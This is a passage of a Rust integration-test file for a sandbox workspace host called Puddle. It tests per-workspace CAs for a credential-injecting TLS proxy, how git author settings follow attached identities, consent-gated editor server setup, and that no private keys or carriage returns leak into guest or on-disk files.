        .create(puddle_compute::SandboxSpec::new(
            ghost.clone(),
            ImageRef::new(FakeRuntime::DEBIAN).unwrap(),
        ))
        .await
        .unwrap();

    let host = rig.start().await;
    assert_eq!(host.reconcile_report().removed, [ghost]);
    assert!(rig.runtime.list().await.unwrap().is_empty());
    assert_eq!(volume_names(&rig).await, ["ws-lost"]);
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_create_is_refused_when_the_runtime_cannot_say_whether_the_volume_exists() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    rig.runtime.inject(
        Op::Volume,
        Fault::once(puddle_compute::ComputeError::Runtime {
            op: "volume",
            message: "volume lookup broke".into(),
        }),
    );

    let reply = api.post("/api/workspaces", &new_workspace("acme")).await;
    assert_eq!(reply.status, 503, "{}", reply.body);
    let message = reply.json()["message"].as_str().unwrap().to_owned();
    assert!(message.contains("ws-acme"), "{message}");
    assert!(message.contains("volume lookup broke"), "{message}");
    assert!(
        api.get("/api/workspaces").await.json()["workspaces"]
            .as_array()
            .unwrap()
            .is_empty()
    );
    host.shutdown().await;
}

// ---- credential injection: the CA, what is decrypted, the authors ---------------------------------

const KEY_MARKER: &[u8] = b"PRIVATE KEY";

fn pem_of(files: &std::collections::BTreeMap<String, Vec<u8>>, path: &str) -> String {
    String::from_utf8(files[path].clone()).unwrap()
}

/// `POST /api/identities`: a `gh` credential on `host` covering the rest of it (or `owners`).
async fn make_identity(api: &Api, label: &str, host: &str, owners: &[&str]) -> i64 {
    let body = json!({
        "label": label,
        "author": {"name": label, "email": format!("{}@example.org", label.to_lowercase())},
        "credentials": [{
            "host": host,
            "source": {"kind": "gh", "host": host, "account": "me"},
            "covers": {"owners": owners, "rest_of_host": owners.is_empty()}
        }]
    });
    let reply = api.post("/api/identities", &body.to_string()).await;
    assert_eq!(reply.status, 201, "{}", reply.body);
    reply.json()["id"].as_i64().unwrap()
}

async fn attach(api: &Api, workspace: &str, identity: i64) {
    let reply = api
        .post(
            &format!("/api/workspaces/{workspace}/identities"),
            &json!({"identity": identity}).to_string(),
        )
        .await;
    assert_eq!(reply.status, 200, "{}", reply.body);
}

fn name(workspace: &str) -> WorkspaceName {
    WorkspaceName::new(workspace).unwrap()
}

fn decrypts(host: &Host<FakeRuntime>, workspace: &str, site: &str) -> bool {
    host.workspaces()
        .termination(&name(workspace))
        .is_some_and(|t| {
            t.set()
                .contains(&puddle_types::Host::parse_normalised(site).unwrap())
        })
}

/// How long a change may take to apply once the host has its event.
const APPLY: Duration = Duration::from_secs(10);

fn calls_of(rig: &Rig, op: &str) -> usize {
    rig.runtime
        .calls()
        .iter()
        .filter(|c| format!("{:?}", c.op) == op)
        .count()
}

#[tokio::test(flavor = "multi_thread")]
async fn a_new_workspace_trusts_its_own_ca_from_the_first_boot_and_decrypts_only_the_login_hosts_yet()
 {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    create(&api, &mut events, "beta").await;

    // The CA the guest was given is the one the proxy signs with, and each workspace has its own.
    let ca_of = |workspace: &str| {
        host.workspaces()
            .termination(&name(workspace))
            .unwrap()
            .ca()
            .certificate()
            .clone()
    };
    let (acme, beta) = (ca_of("acme"), ca_of("beta"));
    assert_ne!(acme, beta);
    let files = rig.guest.plan_files(0);
    for path in [
        "/etc/puddle/extra-cas.pem",
        "/usr/local/share/ca-certificates/puddle/puddle-ca-1.crt",
    ] {
        assert_eq!(pem_of(&files, path), acme.pem(), "{path}");
    }
    let guest_der =
        rustls::pki_types::CertificateDer::from_pem_slice(&files["/etc/puddle/extra-cas.pem"])
            .unwrap();
    assert_eq!(guest_der.as_ref(), acme.der().as_ref());
    assert_ne!(
        pem_of(
            &rig.guest.plan_files(rig.guest.boots() - 1),
            "/etc/puddle/extra-cas.pem"
        ),
        acme.pem()
    );
    // Tools are pointed at the bundle, though no identity decrypts anything yet.
    let env = pem_of(&files, "/etc/profile.d/01-puddle-env.sh");
    assert!(
        env.contains("export SSL_CERT_FILE='/etc/puddle/ca-bundle.pem'"),
        "{env}"
    );
    assert!(
        env.contains("export NODE_EXTRA_CA_CERTS='/etc/puddle/extra-cas.pem'"),
        "{env}"
    );
    // Login capture is on by default: the hosts of the logins are decrypted from the start, and
    // no other.
    assert!(decrypts(&host, "acme", "platform.claude.com"));
    assert!(!decrypts(&host, "acme", "gitlab.com"));
    // No key anywhere in what the guest was sent.
    for (_, plan) in rig.guest.plans.lock().unwrap().iter() {
        assert!(!plan.windows(KEY_MARKER.len()).any(|w| w == KEY_MARKER));
        assert!(!String::from_utf8_lossy(plan).contains("PRIVATE"));
    }
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_credential_for_any_host_applies_to_the_running_workspace_with_no_restart() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    let ca_before = host
        .workspaces()
        .termination(&name("acme"))
        .unwrap()
        .ca()
        .certificate()
        .clone();
    let (creates, starts, stops) = (
        calls_of(&rig, "Create"),
        calls_of(&rig, "Start"),
        calls_of(&rig, "Stop"),
    );

    // A host the workspace has never used, on a host Puddle's default list does not have.
    let gitlab = make_identity(&api, "Ada", "gitlab.com", &[]).await;
    attach(&api, "acme", gitlab).await;
    eventually("gitlab.com decrypted", APPLY, || {
        decrypts(&host, "acme", "gitlab.com")
    })
    .await;
    // A second one, on Azure DevOps: both of its names.
    let azure = make_identity(&api, "Bob", "dev.azure.com", &["contoso"]).await;
    attach(&api, "acme", azure).await;
    eventually("azure decrypted", APPLY, || {
        decrypts(&host, "acme", "contoso.visualstudio.com")
    })
    .await;
    assert!(decrypts(&host, "acme", "dev.azure.com"));
    // Nothing else is: a host nobody gave a credential, and that no login is for, is still spliced.
    assert!(!decrypts(&host, "acme", "example.com"));
    assert!(!decrypts(&host, "acme", "api.gitlab.com"));
    // The CA is the one the guest booted with, and the sandbox was not touched.
    let after = host.workspaces().termination(&name("acme")).unwrap();
    assert_eq!(after.ca().certificate(), &ca_before);
    assert_eq!(
        (
            calls_of(&rig, "Create"),
            calls_of(&rig, "Start"),
            calls_of(&rig, "Stop")
        ),
        (creates, starts, stops)
    );

    // Taking an identity off takes its hosts out of the set on the next connection.
    let gone = api
        .delete(&format!("/api/workspaces/acme/identities/{gitlab}"), None)
        .await;
    assert_eq!(gone.status, 200, "{}", gone.body);
    eventually("gitlab.com no longer decrypted", APPLY, || {
        !decrypts(&host, "acme", "gitlab.com")
    })
    .await;
    assert!(decrypts(&host, "acme", "dev.azure.com"));
    host.shutdown().await;
}

/// A folder that looks like an unpacked code-server release, for `GuestSettings::code_server`.
fn fake_code_server(rig: &Rig) -> PathBuf {
    let dir = rig.dir.path().join("code-server-release");
    std::fs::create_dir_all(dir.join("bin")).unwrap();
    std::fs::write(dir.join("bin/code-server"), b"#!/bin/sh\n").unwrap();
    std::fs::write(dir.join("code-server.json"), br#"{"version": "9.9.9"}"#).unwrap();
    dir
}

fn agent_settings(plan: &[u8]) -> std::collections::BTreeMap<String, String> {
    String::from_utf8_lossy(plan)
        .lines()
        .filter_map(|l| l.strip_prefix("puddle_agent_env "))
        .filter_map(|l| {
            let (name, value) = l.split_once(' ')?;
            Some((
                name.trim_matches('\'').to_owned(),
                value.trim_matches('\'').to_owned(),
            ))
        })
        .collect()
}

#[tokio::test(flavor = "multi_thread")]
async fn a_host_with_code_server_tells_each_guest_where_to_run_the_editor_server() {
    let rig = Rig::new();
    let mut config = rig.config();
    config.guest.code_server = Some(fake_code_server(&rig));
    let host = rig.start_with(config).await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    let installed = rig
        .dir
        .path()
        .join("data/guest-share/puddle/code-server-9.9.9");
    assert!(installed.join("bin/code-server").is_file());
    assert!(installed.join(".puddle-installed").is_file());
    let seen = agent_settings(&rig.guest.plan_bytes(rig.guest.boots() - 1));
    assert_eq!(
        seen.get("PUDDLE_AGENT_EDITOR_DIR").map(String::as_str),
        Some("/puddle/code-server")
    );
    assert_eq!(
        seen.get("PUDDLE_AGENT_EDITOR_DATA").map(String::as_str),
        Some("/workspaces/acme/.puddle/code-server")
    );
    assert_eq!(
        seen.get("PUDDLE_AGENT_EDITOR_FOLDER").map(String::as_str),
        Some("/workspaces/acme")
    );
    // Where an attach writes the multi-root file, for a server that starts after one.
    assert_eq!(
        seen.get("PUDDLE_AGENT_EDITOR_WORKSPACE_FILE")
            .map(String::as_str),
        Some("/workspaces/acme/.puddle/editor/acme.code-workspace")
    );
    assert_eq!(
        seen.get("PUDDLE_AGENT_EDITOR_GRACE").map(String::as_str),
        Some("300")
    );
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn the_workspaces_reconnection_grace_reaches_the_editor_server_at_the_next_start() {
    let rig = Rig::new();
    let mut config = rig.config();
    config.guest.code_server = Some(fake_code_server(&rig));
    let host = rig.start_with(config).await;
    let api = api(&host);
    let mut events = api.events().await;
    let reply = api
        .put(
            "/api/settings/workspaces/acme",
            &json!({"overrides": {"reconnection_grace": 90}}).to_string(),
        )
        .await;
    assert_eq!(reply.status, 200, "{}", reply.body);
    create(&api, &mut events, "acme").await;
    let seen = agent_settings(&rig.guest.plan_bytes(rig.guest.boots() - 1));
    assert_eq!(
        seen.get("PUDDLE_AGENT_EDITOR_GRACE").map(String::as_str),
        Some("90")
    );
    host.shutdown().await;
}

/// Writes a global settings document where the host reads it, before the host starts: the choice
/// of Microsoft's server, with the consent as the document records it.
fn write_global_settings(rig: &Rig, doc: &serde_json::Value) {
    let dir = rig.dir.path().join("data").join("settings");
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(dir.join("global.json"), doc.to_string()).unwrap();
}

fn microsoft_chosen(terms: &str, telemetry: bool) -> serde_json::Value {
    json!({
        "schema_version": 2,
        "vscode_server": {"server": "microsoft", "telemetry": telemetry},
        "consents": {"vscode_server": {"state": "granted", "at": 1, "terms_version": terms}},
    })
}

/// What the first boot of `acme` told the agent about its editor server.
async fn editor_env_of_a_new_workspace(
    rig: &Rig,
    config: HostConfig,
) -> std::collections::BTreeMap<String, String> {
    let host = rig.start_with(config).await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    let seen = agent_settings(&rig.guest.plan_bytes(rig.guest.boots() - 1));
    host.shutdown().await;
    seen
}

#[tokio::test(flavor = "multi_thread")]
async fn microsofts_server_runs_after_consent_with_its_own_folder_and_the_telemetry_choice() {
    for (telemetry, auto_update) in [(false, true), (true, false)] {
        let rig = Rig::new();
        let mut doc = microsoft_chosen(puddle_settings::MICROSOFT_TERMS_VERSION, telemetry);
        doc["vscode_server"]["auto_update"] = json!(auto_update);
        write_global_settings(&rig, &doc);
        // No code-server bundled: Microsoft's is downloaded by the guest, not shipped.
        let seen = editor_env_of_a_new_workspace(&rig, rig.config()).await;
        let get = |name: &str| seen.get(name).map(String::as_str);
        assert_eq!(get("PUDDLE_AGENT_EDITOR_KIND"), Some("microsoft"));
        assert_eq!(
            get("PUDDLE_AGENT_EDITOR_TELEMETRY"),
            Some(if telemetry { "1" } else { "0" })
        );
        assert_eq!(
            get("PUDDLE_AGENT_EDITOR_AUTO_UPDATE"),
            Some(if auto_update { "1" } else { "0" })
        );
        assert_eq!(
            get("PUDDLE_AGENT_EDITOR_DIR"),
            Some("/workspaces/acme/.puddle/vscode-server/servers")
        );
        assert_eq!(
            get("PUDDLE_AGENT_EDITOR_DATA"),
            Some("/workspaces/acme/.puddle/vscode-server")
        );
        assert_eq!(get("PUDDLE_AGENT_EDITOR_FOLDER"), Some("/workspaces/acme"));
        assert_eq!(get("PUDDLE_AGENT_EDITOR_GRACE"), Some("300"));
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn microsofts_server_never_starts_on_the_choice_alone() {
    // The recorded consent is what counts: none, a decline and an agreement to other terms each
    // leave the guest with code-server, and no word about Microsoft's server reaches it.
    let covering = puddle_settings::MICROSOFT_TERMS_VERSION;
    for (what, consents) in [
        ("no consent", json!({})),
        (
            "a decline",
            json!({"vscode_server": {"state": "declined", "at": 1, "terms_version": covering}}),
        ),
        (
            "other terms",
            json!({"vscode_server": {"state": "granted", "at": 1, "terms_version": "https://example.test/old"}}),
        ),
    ] {
        let rig = Rig::new();
        write_global_settings(
            &rig,
            &json!({
                "schema_version": 2,
                "vscode_server": {"server": "microsoft", "telemetry": true},
                "consents": consents,
            }),
        );
        let mut config = rig.config();
        config.guest.code_server = Some(fake_code_server(&rig));
        let seen = editor_env_of_a_new_workspace(&rig, config).await;
        let get = |name: &str| seen.get(name).map(String::as_str);
        assert_eq!(
            get("PUDDLE_AGENT_EDITOR_DIR"),
            Some("/puddle/code-server"),
            "{what}"
        );
        assert_eq!(get("PUDDLE_AGENT_EDITOR_KIND"), None, "{what}");
        assert_eq!(get("PUDDLE_AGENT_EDITOR_TELEMETRY"), None, "{what}");
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn a_host_without_code_server_and_without_microsofts_choice_runs_no_editor_server() {
    let rig = Rig::new();
    // Consent recorded, choice not made: code-server, which this host does not bundle.
    write_global_settings(
        &rig,
        &json!({
            "schema_version": 2,
            "consents": {"vscode_server": {"state": "granted", "at": 1, "terms_version": puddle_settings::MICROSOFT_TERMS_VERSION}},
        }),
    );
    let seen = editor_env_of_a_new_workspace(&rig, rig.config()).await;
    assert!(seen.is_empty(), "{seen:?}");
}

#[tokio::test(flavor = "multi_thread")]
async fn a_host_without_code_server_starts_guests_without_an_editor_server() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    let plan = String::from_utf8(rig.guest.plan_bytes(rig.guest.boots() - 1)).unwrap();
    assert!(!plan.contains("puddle_agent_env"), "{plan}");
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn the_commit_authors_in_the_running_guest_follow_the_identities() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    let booted = rig.guest.boots();
    // No identity yet: no author file, and the workspace's git settings name nobody.
    let files = rig.guest.plan_files(booted - 1);
    assert!(!pem_of(&files, "/etc/puddle/gitconfig").contains("[user]"));

    // Work names acme on github.com; Personal covers the rest of it and is first in the list.
    let personal = make_identity(&api, "Personal", "github.com", &[]).await;
    let work = make_identity(&api, "Work", "github.com", &["Acme"]).await;
    attach(&api, "acme", personal).await;
    rig.guest.boots_reach(booted + 1).await;
    attach(&api, "acme", work).await;
    rig.guest.boots_reach(booted + 2).await;
    let files = rig.guest.plan_files(rig.guest.boots() - 1);
    let config = pem_of(&files, "/etc/puddle/gitconfig");
    // The fallback is the first identity's; the rest-of-host rule comes before the named owner's,
    // so git, which lets the last match win, gives acme's remotes to Work.
    assert!(config.contains("[user]\n\tname = \"Personal\""), "{config}");
    let personal_at = config.find("path = git-author-1.gitconfig").unwrap();
    let work_at = config.find("path = git-author-2.gitconfig").unwrap();
    assert!(personal_at < work_at, "{config}");
    assert!(config.contains("[aA][cC][mM][eE]"), "{config}");
    assert!(pem_of(&files, "/etc/puddle/git-author-2.gitconfig").contains("name = \"Work\""));
    // The guest's trust is what it booted with: the same CA in every run.
    let ca = host
        .workspaces()
        .termination(&name("acme"))
        .unwrap()
        .ca()
        .certificate()
        .clone();
    assert_eq!(pem_of(&files, "/etc/puddle/extra-cas.pem"), ca.pem());

    // A change that moves no author does not touch the guest again.
    let reply = api
        .request(
            "PUT",
            "/api/workspaces/acme/git/switches",
            Some(&json!({"only_push_listed": false}).to_string()),
            true,
        )
        .await;
    assert_eq!(reply.status, 200, "{}", reply.body);
    // Absence window: a change that moves no author must not boot the guest again.
    tokio::time::sleep(Duration::from_millis(300)).await;
    assert_eq!(rig.guest.boots(), booted + 2);

    // Taking both off removes the authors again. One at a time, each seen in the guest: two
    // changes made before the host looks at the first reach the guest as one run, and how many
    // runs that is depends on timing, not on the contract.
    for (n, id) in [personal, work].into_iter().enumerate() {
        api.delete(&format!("/api/workspaces/acme/identities/{id}"), None)
            .await;
        rig.guest.boots_reach(booted + 3 + n).await;
    }
    let files = rig.guest.plan_files(rig.guest.boots() - 1);
    assert!(!pem_of(&files, "/etc/puddle/gitconfig").contains("[user]"));
    assert!(!files.contains_key("/etc/puddle/git-author-1.gitconfig"));
    host.shutdown().await;
}

/// The guest is Linux, so no byte Puddle puts into it may be a carriage return, whatever line
/// ends the host's own text uses (the certificate text of a Windows build ends its lines with
/// CRLF unless it is made with LF on purpose).
#[tokio::test(flavor = "multi_thread")]
async fn nothing_the_boot_plan_puts_into_the_guest_has_a_carriage_return() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    let booted = rig.guest.boots();
    // Two identities, one naming an owner: the CA files, the environment file, the git settings
    // and both kinds of author file all end up in the plan.
    let personal = make_identity(&api, "Personal", "github.com", &[]).await;
    let work = make_identity(&api, "Work", "github.com", &["Acme"]).await;
    attach(&api, "acme", personal).await;
    rig.guest.boots_reach(booted + 1).await;
    attach(&api, "acme", work).await;
    rig.guest.boots_reach(booted + 2).await;

    for n in 0..rig.guest.boots() {
        let plan = rig.guest.plan_bytes(n);
        assert!(!plan.contains(&b'\r'), "plan {n} has a carriage return");
        for (path, bytes) in rig.guest.plan_files(n) {
            assert!(!bytes.contains(&b'\r'), "plan {n}: {path}");
        }
    }
    // The scan saw what it is about: the last plan has every file kind named above.
    let files = rig.guest.plan_files(rig.guest.boots() - 1);
    for path in [
        "/etc/puddle/extra-cas.pem",
        "/etc/puddle/puddle-cas.pem",
        "/usr/local/share/ca-certificates/puddle/puddle-ca-1.crt",
        "/etc/profile.d/01-puddle-env.sh",
        "/etc/puddle/gitconfig",
        "/etc/puddle/git-author-1.gitconfig",
        "/etc/puddle/git-author-2.gitconfig",
    ] {
        assert!(
            files.contains_key(path),
            "{path} is not in {:?}",
            files.keys()
        );
    }
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_stopped_workspace_has_no_ca_and_each_start_makes_a_new_one() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    let first = host
        .workspaces()
        .termination(&name("acme"))
        .unwrap()
        .ca()
        .certificate()
        .clone();

    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    assert!(host.workspaces().termination(&name("acme")).is_none());
    // A change to a workspace that does not run reaches nothing now: its next start reads it.
    let identity = make_identity(&api, "Ada", "github.com", &[]).await;
    attach(&api, "acme", identity).await;
    tokio::time::sleep(Duration::from_millis(200)).await;
    assert!(host.workspaces().termination(&name("acme")).is_none());

    api.post("/api/workspaces/acme/start", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    let second = host.workspaces().termination(&name("acme")).unwrap();
    assert_ne!(second.ca().certificate(), &first);
    assert!(decrypts(&host, "acme", "github.com"));
    // The second boot got the second CA, and not the first.
    let files = rig.guest.plan_files(rig.guest.boots() - 1);
    assert_eq!(
        pem_of(&files, "/etc/puddle/extra-cas.pem"),
        second.ca().certificate().pem()
    );
    assert!(!pem_of(&files, "/etc/puddle/extra-cas.pem").contains(first.pem()));
    // The author came from the identity at the start, with no rewrite after it.
    assert!(pem_of(&files, "/etc/puddle/gitconfig").contains("name = \"Ada\""));
    host.shutdown().await;
}

/// The skipped file is one ed25519 key, the one whose public half is `login_ed25519.pub`: a CA
/// key written under that name would not hide behind the exclusion.
fn assert_is_the_login_key(file: &std::path::Path) {
    use base64::Engine as _;
    let engine = base64::engine::general_purpose::STANDARD;
    let public = std::fs::read_to_string(file.with_extension("pub")).unwrap();
    let public_blob = engine.decode(public.split(' ').nth(1).unwrap()).unwrap();
    let text = std::fs::read_to_string(file).unwrap();
    let lines: Vec<_> = text.lines().collect();
    // The armor lines are spelled in parts: the repository's secret scan looks for the whole.
    let kind = ["OPENSSH", "PRIVATE", "KEY"].join(" ");
    assert_eq!(
        lines.first().copied(),
        Some(format!("-----BEGIN {kind}-----").as_str())
    );
    assert_eq!(
        lines.last().copied(),
        Some(format!("-----END {kind}-----").as_str())
    );
    let body = engine.decode(lines[1..lines.len() - 1].concat()).unwrap();
    assert!(body.starts_with(b"openssh-key-v1\0"));
    assert_eq!(
        body.windows(public_blob.len())
            .filter(|w| *w == public_blob)
            .count(),
        2,
        "the public half is in the file twice (header and key section): one key"
    );
    assert_eq!(
        public_blob.len(),
        4 + b"ssh-ed25519".len() + 4 + 32,
        "an ed25519 public half"
    );
}

#[tokio::test(flavor = "multi_thread")]
async fn no_file_in_the_data_folder_holds_a_key_or_the_ca_whether_the_workspace_runs_or_not() {
    fn files_under(dir: &std::path::Path, out: &mut Vec<PathBuf>) {
        let Ok(entries) = std::fs::read_dir(dir) else {
            return;
        };
        for entry in entries {
            let path = entry.unwrap().path();
            if path.is_dir() {
                files_under(&path, out);
            } else {
                out.push(path);
            }
        }
    }
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    let identity = make_identity(&api, "Ada", "github.com", &[]).await;
    attach(&api, "acme", identity).await;
    eventually("decrypted", APPLY, || decrypts(&host, "acme", "github.com")).await;
    let ca = host
        .workspaces()
        .termination(&name("acme"))
        .unwrap()
        .ca()
        .certificate()
        .clone();
    let body = ca.pem().lines().nth(1).unwrap().to_owned();

    let check = |when: &str| {
        let mut files = Vec::new();
        files_under(&rig.dir.path().join("data"), &mut files);
        files_under(&rig.dir.path().join("runtime"), &mut files);
        assert!(!files.is_empty());
        for file in files {
            // The one key file Puddle keeps is direct SSH's login key: `ssh` reads its identity from
            // a file, so it is owner-only on disk by design, and it opens nothing but the runtime's
            // SSH server. It is made at every start, whether or not the switch is on.
            if file == rig.dir.path().join("data/ssh/login_ed25519") {
                assert_is_the_login_key(&file);
                continue;
            }
            // A file the database or a save is replacing may be gone by now.
            let Ok(bytes) = std::fs::read(&file) else {
                continue;
            };
            assert!(
                !bytes.windows(KEY_MARKER.len()).any(|w| w == KEY_MARKER),
                "{when}: {} holds a key",
                file.display()
            );
            assert!(
                !bytes.windows(body.len()).any(|w| w == body.as_bytes()),
                "{when}: {} holds the CA",
                file.display()
            );
            assert!(
                !bytes
                    .windows(ca.der().len())
                    .any(|w| w == ca.der().as_ref()),
                "{when}: {} holds the CA",
                file.display()
            );
        }
    };
    check("running");
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    check("stopped");
    // A workspace still running at shutdown loses its CA with the host's routes.
    api.post(&format!("/api/workspaces/{}/start", "acme"), "")
        .await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    assert!(host.workspaces().termination(&name("acme")).is_some());
    host.shutdown().await;
    assert!(host.workspaces().termination(&name("acme")).is_none());
    check("after shutdown");
}

#[derive(Debug)]
struct MarkedInjector;

impl puddle_proxy::Injector for MarkedInjector {
    fn decide<'a>(
        &'a self,
        _: &'a puddle_proxy::InjectContext<'a>,
        _: &'a puddle_proxy::RequestView<'a>,
    ) -> futures_util::future::BoxFuture<'a, puddle_proxy::InjectDecision> {
        Box::pin(async { puddle_proxy::InjectDecision::PassThrough })
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn each_start_gets_an_injector_built_for_its_workspace_from_the_hosts_store() {
    let rig = Rig::new();
    let built = Arc::new(Mutex::new(Vec::new()));
    let prepared = prepare(rig.config(), &FakePlatform::new(&rig.log)).unwrap();
    let mut options = hermetic_options();
    let record = built.clone();
    options.injector = Some(Arc::new(
        move |inputs: &puddle_host::InjectorInputs, workspace: &WorkspaceName| {
            record
                .lock()
                .unwrap()
                .push((workspace.clone(), inputs.store.clone()));
            Arc::new(MarkedInjector)
        },
    ));
    let host = Host::start(prepared, &FakeFactory::new(&rig.runtime, &rig.log), options)
        .await
        .unwrap();
    // Nothing is made before a workspace starts.
    assert!(built.lock().unwrap().is_empty());
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    create(&api, &mut events, "beta").await;
    for workspace in ["acme", "beta"] {
        let termination = host.workspaces().termination(&name(workspace)).unwrap();
        assert!(
            format!("{termination:?}").contains("MarkedInjector"),
            "{termination:?}"
        );
    }
    let made = built.lock().unwrap().clone();
    let workspaces: Vec<&WorkspaceName> = made.iter().map(|(w, _)| w).collect();
    assert_eq!(workspaces, [&name("acme"), &name("beta")]);
    assert!(
        made.iter()
            .all(|(_, store)| Arc::ptr_eq(store, host.store()))
    );
    // A start in place makes a new one.
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    api.post("/api/workspaces/acme/start", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(built.lock().unwrap().len(), 3);
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_start_that_fails_after_the_ca_was_made_leaves_no_ca_behind() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    // A create whose boot fails.
    rig.guest.fail_boot.store(true, Ordering::SeqCst);
    let reply = api.post("/api/workspaces", &new_workspace("acme")).await;
    assert_eq!(reply.status, 202, "{}", reply.body);
    let end = events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(end["step"], "failed", "{end}");
    assert!(host.workspaces().termination(&name("acme")).is_none());

    // A start in place whose boot fails.
    rig.guest.fail_boot.store(false, Ordering::SeqCst);
    create(&api, &mut events, "beta").await;
    api.post("/api/workspaces/beta/stop", "").await;
    events.until(ended("beta"), Duration::from_secs(20)).await;
    rig.guest.fail_boot.store(true, Ordering::SeqCst);
    api.post("/api/workspaces/beta/start", "").await;
    let end = events.until(ended("beta"), Duration::from_secs(20)).await;
    assert_eq!(end["step"], "failed", "{end}");
    assert!(host.workspaces().termination(&name("beta")).is_none());
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn the_company_roots_go_into_the_clients_that_verify_decrypted_hosts() {
    // A host with company roots starts: the TLS client for decrypted hosts is built with them.
    let rig = Rig::new();
    let mut platform = FakePlatform::new(&rig.log);
    platform.roots = company_roots();
    let prepared = prepare(rig.config(), &platform).unwrap();
    let host = Host::start(
        prepared,
        &FakeFactory::new(&rig.runtime, &rig.log),
        hermetic_options(),
    )
    .await
    .unwrap();
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    // The host's own TLS client took the company root: nothing is reported as left out.
    let report = api.get("/api/network-health").await.json();
    assert_eq!(report["roots"]["left_out_of_tls"], json!([]));
    // The guest got the company root and the CA in one extra-CAs file.
    let files = rig.guest.plan_files(0);
    let extra = pem_of(&files, "/etc/puddle/extra-cas.pem");
    assert_eq!(extra.matches("BEGIN CERTIFICATE").count(), 2, "{extra}");
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_company_root_the_hosts_own_tls_client_cannot_use_is_reported_as_left_out() {
    // The root states its extended key usage twice: the guest still gets it (its own verifiers
    // decide), but the host's TLS client for decrypted hosts leaves it out.
    let rig = Rig::new();
    let mut platform = FakePlatform::new(&rig.log);
    platform.roots = company_roots_with(|params| {
        for _ in 0..2 {
            params
                .custom_extensions
                .push(rcgen::CustomExtension::from_oid_content(
                    &[2, 5, 29, 37],
                    vec![48, 0],
                ));
        }
    });
    let fingerprint = platform.roots.certificates()[0].fingerprint().to_string();
    let prepared = prepare(rig.config(), &platform).unwrap();
    let host = Host::start(
        prepared,
        &FakeFactory::new(&rig.runtime, &rig.log),
        hermetic_options(),
    )
    .await
    .unwrap();
    let report = api(&host).get("/api/network-health").await.json();
    let left_out = &report["roots"]["left_out_of_tls"];
    assert_eq!(left_out.as_array().map(Vec::len), Some(1), "{report}");
    assert_eq!(left_out[0]["subject"], "Corp Root CA");
    assert_eq!(left_out[0]["fingerprint"], fingerprint.as_str());
    assert_ne!(left_out[0]["reason"], "", "{left_out}");
    host.shutdown().await;
}

/// Opens the host's database next to it and runs `sql` (a row the store would never write).
fn damage_database(rig: &Rig, sql: &str) {
    let db = rusqlite::Connection::open(rig.dir.path().join("data").join("puddle.db")).unwrap();
    db.execute_batch(sql).unwrap();
}

const UNREADABLE_GIT_ROW: &str = "INSERT INTO workspace_repos \
    (workspace_id, host, owner, repo, pull, push, created_at) \
    VALUES ('{}', 'github.com', 'acme', 'not a repo', 1, 1, 0)";

#[tokio::test(flavor = "multi_thread")]
async fn git_settings_the_host_cannot_read_stop_a_start_and_change_nothing_while_running() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    create(&api, &mut events, "beta").await;
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;

    // acme's settings are damaged: its start says why and leaves no CA.
    damage_database(&rig, &UNREADABLE_GIT_ROW.replace("{}", "acme"));
    api.post("/api/workspaces/acme/start", "").await;
    let end = events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(end["step"], "failed", "{end}");
    assert!(
        end["detail"]
            .as_str()
            .unwrap()
            .contains("cannot read acme's Git settings"),
        "{end}"
    );
    assert!(host.workspaces().termination(&name("acme")).is_none());

    // beta runs; its settings are damaged after the start: what it decrypts stays as it was.
    let identity = make_identity(&api, "Ada", "github.com", &[]).await;
    attach(&api, "beta", identity).await;
    eventually("github.com decrypted", APPLY, || {
        decrypts(&host, "beta", "github.com")
    })
    .await;
    damage_database(&rig, &UNREADABLE_GIT_ROW.replace("{}", "beta"));
